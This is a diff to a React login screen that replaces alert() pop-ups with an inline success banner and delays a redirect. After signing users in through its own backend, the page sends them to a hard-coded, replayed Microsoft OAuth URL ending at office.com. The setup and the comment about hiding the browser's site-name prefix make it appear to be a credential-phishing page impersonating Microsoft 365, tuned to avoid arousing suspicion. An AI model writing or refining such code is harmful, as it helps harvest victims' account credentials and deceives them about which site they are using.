@@ -14,6 +14,7 @@ export default function LoginScreen() {
   const [passwordFocused, setPasswordFocused] = useState(false);
 
   const [error, setError] = useState('');
+  const [success, setSuccess] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
   // Validate Step 1 (Email / Username)
@@ -64,8 +65,12 @@ export default function LoginScreen() {
         // Save token
         localStorage.setItem('token', data.token);
 
-        alert(data.message || 'Login successful');
-        window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';
+        // Show inline success message instead of native alert (browser prefixes site name)
+        setSuccess(data.message || 'Login successful');
+        // Delay redirect so user can briefly see the success banner
+        setTimeout(() => {
+          window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';
+        }, 1400);
 
       } else {
         // Register Mode
@@ -102,10 +107,13 @@ export default function LoginScreen() {
 
         const loginData = await loginRes.json();
 
-        if (loginRes.ok) {
+          if (loginRes.ok) {
           localStorage.setItem('token', loginData.token);
-          alert('Account created and logged in successfully.');
-          window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';
+          // Show inline success message instead of native alert
+          setSuccess('Account created and logged in successfully.');
+          setTimeout(() => {
+            window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';
+          }, 1400);
         } else {
           setError('Account created, but automatic login failed. Please sign in manually.');
           setMode('login');
@@ -165,6 +173,13 @@ export default function LoginScreen() {
           {error && (
             <div className="w-full mb-4 px-4 py-3 rounded-lg bg-red-50 border border-red-200 text-sm font-medium text-red-600 animate-fadeIn">
               {error}
+            </div>
+          )}
+
+          {/* Success Message */}
+          {success && (
+            <div className="w-full mb-4 px-4 py-3 rounded-lg bg-green-50 border border-green-200 text-sm font-medium text-green-700 animate-fadeIn">
+              {success}
             </div>
           )}
 
